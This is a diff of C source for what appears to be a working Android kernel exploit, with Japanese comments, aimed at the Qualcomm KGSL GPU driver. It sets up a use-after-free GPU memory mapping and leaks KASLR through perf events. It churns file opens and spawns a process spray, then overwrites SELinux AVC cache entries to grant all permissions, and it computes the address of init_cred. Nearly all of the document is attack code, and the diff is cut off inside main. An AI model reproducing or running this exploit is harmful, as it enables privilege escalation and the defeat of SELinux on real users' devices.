@@ -1,41 +1,99 @@
 
 
-#include "avc_bypass.h"
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <stdint.h>
+#include <stdbool.h>
 #include <fcntl.h>
 #include <unistd.h>
 #include <errno.h>
 #include <sys/mman.h>
 #include <sys/prctl.h>
 #include <sys/wait.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <sys/ioctl.h>
 #include <sys/syscall.h>
 #include <linux/perf_event.h>
 #include <asm/unistd.h>
 #include <time.h>
 #include <signal.h>
 #include <dirent.h>
+#include <pthread.h>
 
+/* ============ KGSL 定義（avc_bypass.h からコピー） ============ */
+#define KGSL_IOC_TYPE 0x09
+
+struct kgsl_gpuobj_alloc {
+    uint64_t size; uint64_t flags; uint64_t va_len;
+    uint64_t mmapsize; unsigned int id;
+    unsigned int metadata_len; uint64_t metadata;
+};
+#define IOCTL_KGSL_GPUOBJ_ALLOC _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)
+
+struct kgsl_gpuobj_free { uint64_t flags; uint64_t priv; unsigned int id; unsigned int type; unsigned int len; unsigned int __pad; };
+#define IOCTL_KGSL_GPUOBJ_FREE _IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)
+
+struct kgsl_gpuobj_info { uint64_t gpuaddr, flags, size, va_len, va_addr; unsigned int id; };
+#define IOCTL_KGSL_GPUOBJ_INFO _IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)
+
+struct kgsl_gpuobj_import { uint64_t priv; uint64_t priv_len; uint64_t flags; unsigned int type; unsigned int id; };
+#define IOCTL_KGSL_GPUOBJ_IMPORT _IOWR(KGSL_IOC_TYPE, 0x48, struct kgsl_gpuobj_import)
+
+struct kgsl_gpuobj_import_useraddr { uint64_t virtaddr; };
+
+struct kgsl_drawctxt_create { unsigned int flags; unsigned int drawctxt_id; };
+#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)
+
+struct kgsl_command_object { uint64_t offset; uint64_t gpuaddr; uint64_t size; unsigned int flags; unsigned int id; };
+
+struct kgsl_gpu_command {
+    uint64_t flags; uint64_t cmdlist; unsigned int cmdsize, numcmds;
+    uint64_t objlist; unsigned int objsize, numobjs;
+    uint64_t synclist; unsigned int syncsize, numsyncs;
+    unsigned int context_id, timestamp;
+};
+#define IOCTL_KGSL_GPU_COMMAND _IOWR(KGSL_IOC_TYPE, 0x4A, struct kgsl_gpu_command)
+
+struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, timestamp; };
+#define IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID _IOWR(KGSL_IOC_TYPE, 0x16, struct kgsl_cmdstream_readtimestamp_ctxtid)
+
+#define KGSL_MEMFLAGS_USE_CPU_MAP (1ULL << 28)
+#define KGSL_CACHEMODE_SHIFT 0
+#define KGSL_CACHEMODE_MASK 3
+#define KGSL_CACHEMODE_WRITEBACK 3
+#define KGSL_USER_MEM_TYPE_ADDR 2
+#define KGSL_CONTEXT_PREAMBLE 0x00000010
+#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000002
+#define KGSL_CMDLIST_IB 0x00000001U
+#define KGSL_TIMESTAMP_RETIRED 0x00000002
+
+#define UAF_ADDR  0x7001ff000ULL
+#define UAF_SIZE  0x10004000ULL
+#define AVC_ENFORCE_PATH "/sys/fs/selinux/enforce"
+#define AVC_NODE_STRIDE  72
+#define SPRAY_PIDS 2000
+
+#define VMLINUX_TEXT 0xffffffc010080000ULL
+#define VMLINUX_INIT_CRED_OFFSET 0x26fa738
+
+/* ============ グローバル変数 ============ */
 static int kgsl_fd = -1;
-static uint64_t alloc_flags = 0;
 static void *uaf_map = NULL;
-static uint64_t uaf_gpuaddr = 0;
 
 static void die(const char *msg) { perror(msg); exit(1); }
 
-/* ============ KGSL 基本操作 (CPU マップ付き) ============ */
+/* ============ KGSL 基本操作 ============ */
 static int gpuobj_alloc(uint64_t size, uint64_t flags) {
     struct kgsl_gpuobj_alloc a = { .size = size, .flags = flags };
     if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0) die("gpuobj_alloc");
     return a.id;
 }
-
 static void gpuobj_free(unsigned int id) {
     struct kgsl_gpuobj_free f = { .id = id };
     if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f) < 0) die("gpuobj_free");
 }
-
 static int gpuobj_info(unsigned int id, uint64_t *gpuaddr) {
     struct kgsl_gpuobj_info inf = { .id = id };
     int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &inf);
@@ -43,11 +101,10 @@ static int gpuobj_info(unsigned int id, uint64_t *gpuaddr) {
     return ret;
 }
 
-/* ============ KASLR 検出（init_cred は不要だが一応） ============ */
+/* ============ KASLR 検出（デバッグ用） ============ */
 static long perf_open(struct perf_event_attr *attr, pid_t pid, int cpu, int group_fd, unsigned long flags) {
     return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
 }
-
 static uint64_t detect_kaslr(void) {
     struct perf_event_attr pe = {0};
     pe.type = PERF_TYPE_HARDWARE;
@@ -93,8 +150,12 @@ static uint64_t detect_kaslr(void) {
     return (first_ip - VMLINUX_TEXT) & ~0x1FFFFFULL;
 }
 
-/* ============ チャーン (AVC ノード生成) ============ */
+/* ============ チャーン（簡易版） ============ */
 #define CHURN_MAX_PATHS 20000
+static char churn_paths[CHURN_MAX_PATHS][160];
+static int churn_npaths = 0;
+static int churn_built = 0;
+
 static const char *churn_dirs[] = {
     "/sys/kernel", "/sys/devices", "/sys/module", "/sys/class",
     "/proc/sys", "/proc/irq", "/proc/1", "/proc/2", "/proc/3",
@@ -103,10 +164,6 @@ static const char *churn_dirs[] = {
     "/system/lib64", "/data/data", "/data/app", "/data/user/0",
     "/dev", "/proc",
 };
-
-static char churn_paths[CHURN_MAX_PATHS][160];
-static int churn_npaths = 0;
-static int churn_built = 0;
 
 static void churn_walk(const char *dir, int depth) {
     if (depth > 5 || churn_npaths >= CHURN_MAX_PATHS) return;
@@ -141,24 +198,15 @@ static void churn_round(void) {
         int fd = open(churn_paths[i], O_RDONLY | O_CLOEXEC);
         if (fd >= 0) close(fd);
     }
-    int s = socket(AF_INET, SOCK_STREAM, 0);
-    if (s >= 0) { close(s); }
-    s = socket(AF_UNIX, SOCK_STREAM, 0);
-    if (s >= 0) {
-        struct sockaddr_un su = { .sun_family = AF_UNIX };
-        strcpy(su.sun_path, "/data/local/tmp/cs.sock");
-        bind(s, (struct sockaddr *)&su, sizeof(su));
-        close(s);
-        unlink("/data/local/tmp/cs.sock");
+    // 追加の AVC トリガー：いくつかのシステムコールを発行
+    for (int i = 0; i < 100; i++) {
+        int fd = open("/sys/fs/selinux/enforce", O_WRONLY);
+        if (fd >= 0) { write(fd, "1", 1); close(fd); }
+        usleep(50);
     }
-    msgget(IPC_PRIVATE, 0600 | IPC_CREAT);
-    semget(IPC_PRIVATE, 1, 0600 | IPC_CREAT);
-    shmget(IPC_PRIVATE, 4096, 0600 | IPC_CREAT);
-    mknod("/data/local/tmp/cn", S_IFCHR | 0600, makedev(1, 3));
 }
 
 /* ============ 子プロセススプレー ============ */
-#define SPRAY_PIDS 2000
 static pid_t spray_pids[SPRAY_PIDS];
 static int n_spray = 0;
 
@@ -201,17 +249,13 @@ static int scan_and_flip_cpu(void *start, size_t size, int verbose) {
     size_t num_dwords = size / 4;
     int flips = 0;
 
-    // avc_node の stride は 72 バイト (18 dwords)
-    // 各ノードの先頭 4 dwords を見る: sid, tsid, tclass, allowed
-    // tsid==2 (SECURITY), tclass==1
     for (size_t i = 0; i + 3 < num_dwords; i += AVC_NODE_STRIDE / 4) {
         uint32_t sid = p[i];
         uint32_t tsid = p[i+1];
         uint32_t tclass = p[i+2];
         uint32_t allowed = p[i+3];
         if (sid >= 1 && sid <= 0x3fff && tsid == 2 && tclass == 1) {
-            // このノードの allowed を 0xFFFFFFFF に設定
-            if ((allowed & 0x80) == 0) {  // まだ setenforce ビットが立っていない場合のみ
+            if ((allowed & 0x80) == 0) {
                 p[i+3] = 0xFFFFFFFF;
                 flips++;
                 if (verbose)
@@ -241,13 +285,12 @@ int main(int argc, char **argv) {
         return 1;
     }
     printf("[+] KASLR = 0x%lx\n", kaslr);
-    // init_cred は使わないが、参考まで
     uint64_t init_cred_addr = kaslr + VMLINUX_INIT_CRED_OFFSET;
-    printf("[*] init_cred = 0x%lx\n", init_cred_addr);
+    printf("[*] init_cred = 0x%lx (reference only)\n", init_cred_addr);
 
     // ---- Phase 1: CPU マップ付き巨大オブジェクト確保 + mmap ----
     printf("[*] Phase 1: Allocate large GPU object with CPU map and mmap\n");
-    alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
+    uint64_t alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
     int uaf_id = gpuobj_alloc(UAF_SIZE, alloc_flags);
     uint64_t uaf_gpuaddr = 0;
     gpuobj_info(uaf_id, &uaf_gpuaddr);
